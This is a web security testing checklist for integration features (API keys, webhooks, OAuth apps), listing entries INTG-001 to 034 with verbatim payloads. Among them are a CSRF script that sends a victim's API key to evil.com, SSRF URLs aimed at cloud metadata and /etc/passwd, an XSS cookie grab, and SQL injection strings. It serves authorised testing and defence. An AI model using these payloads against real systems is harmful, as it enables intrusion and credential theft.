# 18. Integration Features — Checklist

Feature-area security **test cases** for “18. Integration Features”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*184 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## INTG-001 — API Key Exposure in Client-Side Code
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Inspect page source and all JavaScript files for API keys. 2. Search for common patterns like api_key or apiKey or x-api-key or Authorization headers. 3. Check browser localStorage and sessionStorage. 4. Inspect mobile app bundles if applicable.

**Expected Result:** Application must never expose API keys in client-side code or browser-accessible storage and must use server-side proxying for sensitive API calls.

**Payload Example:**

```
Search source for api_key=;apiKey=;x-api-key:;Authorization: Bearer;AKIA (AWS);AIzaSy (Google);sk_live (Stripe)
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** GitLeaks;TruffleHog;Browser DevTools;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-002 — IDOR on API Key Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Login as User A and retrieve own API keys. 2. Intercept the request and change user_id or account_id to User B. 3. Check if User B's API keys are returned. 4. Try accessing other users' key management endpoints.

**Expected Result:** Application must verify that the authenticated user can only access and manage their own API keys.

**Payload Example:**

```
Change GET /api/keys?user_id=1001 to user_id=1002;change GET /api/accounts/1002/api-keys with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-003 — API Key Creation Without Rate Limiting
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Generate API keys repeatedly via the creation endpoint. 2. Send hundreds of key creation requests. 3. Check if rate limiting or maximum key count is enforced. 4. Monitor for resource exhaustion.

**Expected Result:** Application must enforce maximum API key count per user and rate limit key creation requests to prevent abuse and resource exhaustion.

**Payload Example:**

```
Send 500+ POST /api/keys/create requests in rapid succession;check for max key limit
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## INTG-004 — API Key Revocation Bypass
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Create an API key and note it. 2. Revoke the key through the management interface. 3. Attempt to use the revoked key for API calls. 4. Check if the revoked key is still accepted.

**Expected Result:** Application must immediately invalidate revoked API keys and reject all subsequent requests using them.

**Payload Example:**

```
Use revoked API key in header X-API-Key: REVOKED_KEY_VALUE or Authorization: Bearer REVOKED_KEY for authenticated endpoint
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-005 — API Key Permission Escalation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Create an API key with read-only permissions. 2. Attempt write operations using the read-only key. 3. Modify key scope parameters during creation. 4. Check if permission boundaries are enforced.

**Expected Result:** Application must enforce API key permission scopes on every request and reject operations exceeding the key's granted permissions.

**Payload Example:**

```
Create key with scope=read then attempt POST/PUT/DELETE operations;modify scope=read to scope=admin during key creation
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-006 — API Key Brute Force Attack
**Test Category:** Authentication (WSTG-ATHN-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Analyze API key format and length. 2. Calculate entropy of generated keys. 3. Attempt brute force of API key values. 4. Check for account lockout or rate limiting on invalid key attempts.

**Expected Result:** Application must generate API keys with sufficient entropy (minimum 128 bits) and implement rate limiting on authentication failures.

**Payload Example:**

```
Brute force X-API-Key header with sequential or pattern-based values;test short key formats for predictability
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder;Hydra;Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-007 — API Key Leakage in Logs and Error Messages
**Test Category:** Information Disclosure (WSTG-ERRH-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Send requests with invalid API keys. 2. Examine error responses for key reflection. 3. Check server logs for API key logging. 4. Trigger verbose errors with malformed keys.

**Expected Result:** Application must never reflect API key values in error responses or log full API key values in application logs.

**Payload Example:**

```
Send invalid API key and check if error says "Invalid key: sk_live_abc123...";check access logs for full key values
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Log Analysis Tools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-008 — API Key Deletion IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Delete own API key. 2. Intercept the DELETE request and change key_id to another user's key. 3. Check if another user's API key is deleted. 4. Verify ownership checks.

**Expected Result:** Application must verify that the authenticated user owns the API key before allowing deletion.

**Payload Example:**

```
Change DELETE /api/keys/KEY-1001 to DELETE /api/keys/KEY-2001 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-009 — API Key Rotation Vulnerability
**Test Category:** Security Misconfiguration (WSTG-CONF-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Check if API key rotation is supported. 2. Rotate the key and verify old key is invalidated. 3. Check if there is a grace period where both old and new keys work. 4. Test for unlimited grace period.

**Expected Result:** Application must support API key rotation and invalidate old keys immediately or within a very short configurable grace period.

**Payload Example:**

```
Rotate key then use old_key and new_key simultaneously;check if both work indefinitely after rotation
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite;Postman

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## INTG-010 — Mass Assignment on API Key Object
**Test Category:** Mass Assignment (WSTG-INPV-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Create or update an API key. 2. Add hidden parameters like is_admin=true or rate_limit=unlimited or scope=all. 3. Check if unauthorized fields are accepted and processed.

**Expected Result:** Application must whitelist allowed API key creation parameters and ignore any unexpected or privileged fields.

**Payload Example:**

```
Add is_admin=true&rate_limit=0&scope=superadmin&bypass_auth=true to POST /api/keys/create body
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## INTG-011 — CSRF on API Key Generation
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Craft a malicious page that auto-generates a new API key for the victim. 2. Exfiltrate the key via the response. 3. Lure victim to visit while authenticated. 4. Check for CSRF protection.

**Expected Result:** Application must validate anti-CSRF tokens on all API key management operations including creation and deletion.

**Payload Example:**

```
<script>fetch('/api/keys/create',{method:'POST',credentials:'include'}).then(r=>r.json()).then(d=>fetch('https://evil.com/steal?key='+d.api_key))</script>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## INTG-012 — API Key Scope Tampering After Creation
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. Create an API key with limited scope. 2. Intercept the key update request. 3. Modify the scope to include admin or privileged permissions. 4. Check if scope escalation is processed.

**Expected Result:** Application must restrict API key scope modifications to authorized administrators and validate scope changes against allowed values.

**Payload Example:**

```
PUT /api/keys/KEY-1001 with scope=read;write;admin;delete instead of original scope=read
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## INTG-013 — API Key Usage Analytics IDOR
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** API Key Management

**Test Steps:** 1. View usage analytics for own API key. 2. Change key_id to view another user's API key usage patterns. 3. Check if request history and endpoints accessed are exposed.

**Expected Result:** Application must restrict API key usage analytics to the key owner and not expose usage patterns to unauthorized users.

**Payload Example:**

```
GET /api/keys/KEY-2001/usage;GET /api/keys/KEY-2001/analytics with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-014 — SSRF via Webhook URL
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Configure a webhook. 2. Set the webhook URL to internal network addresses. 3. Trigger the webhook event. 4. Check if the server makes requests to internal services. 5. Test with cloud metadata endpoints.

**Expected Result:** Application must validate webhook URLs against an allowlist and block access to internal networks including localhost and cloud metadata services.

**Payload Example:**

```
webhook_url=http://169.254.169.254/latest/meta-data/;url=http://localhost:8080/admin;url=http://10.0.0.1:3306/;url=http://[::1]:22/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator;SSRFMap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-015 — Webhook URL DNS Rebinding Attack
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Set up a DNS rebinding domain that resolves to an external IP initially then to an internal IP. 2. Configure this as the webhook URL. 3. Trigger the webhook. 4. Check if the request reaches the internal network after DNS rebinding.

**Expected Result:** Application must implement DNS resolution pinning and re-validate the resolved IP at connection time to prevent DNS rebinding attacks.

**Payload Example:**

```
webhook_url=http://rebind.attacker.com (first resolves to external then to 169.254.169.254)
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Singularity;Custom DNS

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-016 — IDOR on Webhook Configuration Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Create and view own webhook configuration. 2. Change webhook_id or account_id to another user's webhook. 3. Check if other users' webhook configurations including secret tokens are exposed.

**Expected Result:** Application must verify ownership before displaying or modifying any webhook configuration.

**Payload Example:**

```
GET /api/webhooks/WH-2001;GET /api/webhooks?account_id=1002 with User A credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-017 — Webhook Secret Token Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Create a webhook with a secret token. 2. Access the webhook configuration via API. 3. Check if the full secret token is returned in the response. 4. Check browser storage and logs.

**Expected Result:** Application must mask or omit webhook secret tokens in API responses showing only the last few characters or a hash.

**Payload Example:**

```
Check GET /api/webhooks/WH-1001 response for full webhook_secret;signing_secret;hmac_key values
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## INTG-018 — Webhook Replay Attack
**Test Category:** Session Management (WSTG-SESS-03) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Capture a legitimate webhook payload and headers. 2. Replay the exact same request to the webhook endpoint. 3. Check if the replayed webhook is processed again. 4. Verify timestamp and nonce validation.

**Expected Result:** Application must implement webhook replay protection using timestamps and nonces and reject webhooks with expired timestamps or reused nonces.

**Payload Example:**

```
Replay captured POST /webhook/callback with same X-Signature and X-Timestamp headers;check for nonce validation
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-019 — Webhook Signature Bypass
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Send a webhook request without a signature header. 2. Send with an invalid signature. 3. Send with an empty signature. 4. Modify the payload while keeping the original signature. 5. Check which scenarios are accepted.

**Expected Result:** Application must require and validate webhook signatures on every incoming webhook request and reject any with invalid or missing signatures.

**Payload Example:**

```
Remove X-Webhook-Signature header;set signature to empty string;modify payload without updating signature;use signature=none
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## INTG-020 — Webhook Endpoint XSS
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Configure a webhook with XSS payload in the URL or description or name field. 2. View the webhook configuration page. 3. Check if the payload executes when the configuration is rendered.

**Expected Result:** Application must sanitize all webhook configuration fields and encode output when rendering webhook management interfaces.

**Payload Example:**

```
webhook_name=<script>alert(document.cookie)</script>;webhook_description=<img src=x onerror=alert(1)>;webhook_url=javascript:alert(1)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## INTG-021 — Webhook URL Injection for Port Scanning
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Configure webhooks with URLs targeting different internal ports. 2. Trigger each webhook. 3. Analyze response times and error messages to determine open ports. 4. Map internal network services.

**Expected Result:** Application must not allow webhook URLs to target internal networks and should not reveal port status through response differences.

**Payload Example:**

```
webhook_url=http://10.0.0.1:22;http://10.0.0.1:3306;http://10.0.0.1:6379;http://10.0.0.1:8080;compare response times
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Collaborator;Custom Scripts

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-022 — Webhook Configuration SQL Injection
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Create or update webhook configuration. 2. Inject SQL payloads in webhook name or URL or event filter fields. 3. Observe response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for all webhook configuration database operations.

**Payload Example:**

```
webhook_name=' OR 1=1--;event_filter=order.created' UNION SELECT password FROM users--;url=http://test.com/' OR '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-023 — Webhook Event Type Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Create a webhook subscribing to allowed events. 2. Modify the event subscription to include privileged events like admin.action or user.password_changed. 3. Check if privileged events are delivered.

**Expected Result:** Application must validate webhook event subscriptions against allowed events for the user's role and reject privileged event subscriptions.

**Payload Example:**

```
Change events=["order.created"] to events=["order.created";"admin.login";"user.password_changed";"payment.processed"]
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## INTG-024 — Webhook Deletion CSRF
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Craft a malicious page that deletes the victim's webhook configurations. 2. Lure the authenticated victim to visit. 3. Check if webhooks are deleted without CSRF token validation.

**Expected Result:** Application must validate CSRF tokens on all webhook management operations including deletion.

**Payload Example:**

```
<img src='https://target.com/api/webhooks/WH-1001/delete'>;auto-submit form for DELETE /api/webhooks/WH-1001
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite;Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## INTG-025 — Webhook Rate Limit Bypass for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Configure a webhook. 2. Trigger the associated event thousands of times rapidly. 3. Check if webhook delivery is rate limited. 4. Monitor for DoS on the webhook endpoint.

**Expected Result:** Application must implement rate limiting on webhook deliveries and support backoff strategies to prevent overwhelming recipient servers.

**Payload Example:**

```
Trigger 10000+ events per minute causing massive webhook delivery flood to configured URL
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite Intruder;JMeter

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## INTG-026 — Webhook Payload Injection
**Test Category:** Injection (WSTG-INPV-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Trigger events that generate webhook payloads containing user-controlled data. 2. Include injection payloads in the user data. 3. Check if the receiving system processes injected content unsafely.

**Expected Result:** Application must sanitize all user-controlled data included in webhook payloads to prevent injection attacks on downstream systems.

**Payload Example:**

```
Set order_name=<script>alert(1)</script> or customer_name='; DROP TABLE orders;-- which gets included in webhook JSON payload
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## INTG-027 — Webhook URL Scheme Bypass
**Test Category:** SSRF (WSTG-INPV-19) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Webhook Configuration

**Test Steps:** 1. Configure webhook with non-HTTP schemes. 2. Try file:// and gopher:// and dict:// and ftp:// protocols. 3. Check if the application restricts URL schemes to HTTPS only.

**Expected Result:** Application must restrict webhook URLs to HTTPS protocol only and reject all other URL schemes.

**Payload Example:**

```
webhook_url=file:///etc/passwd;url=gopher://localhost:6379/_INFO;url=dict://localhost:6379/info;url=ftp://internal:21/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite;Postman

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## INTG-028 — OAuth App Client Secret Exposure
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Register an OAuth application. 2. Check if client_secret is exposed in client-side code or API responses. 3. Verify if client_secret is returned after initial creation. 4. Check browser storage.

**Expected Result:** Application must only display the client_secret once during initial registration and never expose it in subsequent API responses or client-side code.

**Payload Example:**

```
Check GET /api/oauth/apps/APP-1001 response for client_secret;search localStorage for oauth_secret;client_secret
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-029 — OAuth Redirect URI Manipulation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Register an OAuth app with a valid redirect_uri. 2. During authorization change redirect_uri to an attacker-controlled domain. 3. Check if the authorization code is sent to the attacker's domain. 4. Test with subdomain and path variations.

**Expected Result:** Application must strictly validate redirect_uri against registered values using exact string matching and reject any deviations.

**Payload Example:**

```
redirect_uri=https://evil.com;redirect_uri=https://target.com.evil.com;redirect_uri=https://target.com@evil.com;redirect_uri=https://target.com/.evil.com
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-030 — OAuth App Registration Without Proper Authorization
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. As a regular user attempt to register OAuth applications. 2. Check if app registration is restricted to authorized developer accounts. 3. Register with elevated permissions.

**Expected Result:** Application must restrict OAuth app registration to authorized developer accounts and validate permissions during registration.

**Payload Example:**

```
POST /api/oauth/apps/register with regular user credentials;add developer_role=true to request
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-031 — OAuth App Scope Escalation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Register OAuth app with limited scopes. 2. During authorization request broader scopes than registered. 3. Check if unregistered scopes are granted. 4. Modify scope parameter in authorization URL.

**Expected Result:** Application must validate requested scopes against the app's registered scopes and reject requests for unregistered scopes.

**Payload Example:**

```
Change scope=read to scope=read+write+admin+delete in authorization URL;request scope=* or scope=all
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-032 — OAuth Authorization Code Theft via Referer
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Complete OAuth authorization flow. 2. Check if the authorization code appears in the URL. 3. Click external links on the callback page. 4. Verify if the code leaks via Referer header.

**Expected Result:** Application must use short-lived authorization codes and implement Referrer-Policy: no-referrer on callback pages to prevent code leakage.

**Payload Example:**

```
Check Referer header after clicking external link on /callback?code=AUTH_CODE_VALUE page
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser DevTools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-033 — OAuth CSRF on Authorization
**Test Category:** CSRF (WSTG-SESS-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. Initiate OAuth authorization. 2. Check if state parameter is used and validated. 3. Craft authorization URL without state or with attacker's state. 4. Test for authorization CSRF.

**Expected Result:** Application must generate and validate the state parameter in OAuth flows to prevent CSRF attacks on authorization.

**Payload Example:**

```
Craft authorization URL without state parameter;use attacker's pre-generated state to link victim's account
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Browser

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## INTG-034 — IDOR on OAuth App Management
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** OAuth App Registration

**Test Steps:** 1. View own OAuth app details. 2. Change app_id to another developer's app. 3. Check if other developer's app details including client_secret are accessible. 4. Try modifying other apps.

**Expected Result:** Application must verify app ownership before displaying or allowing modification of OAuth application details.

**Payload Example:**

```
GET /api/oauth/apps/APP-2001;PUT /api/oauth/apps/APP-2001 with User A credentials
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite;Postman

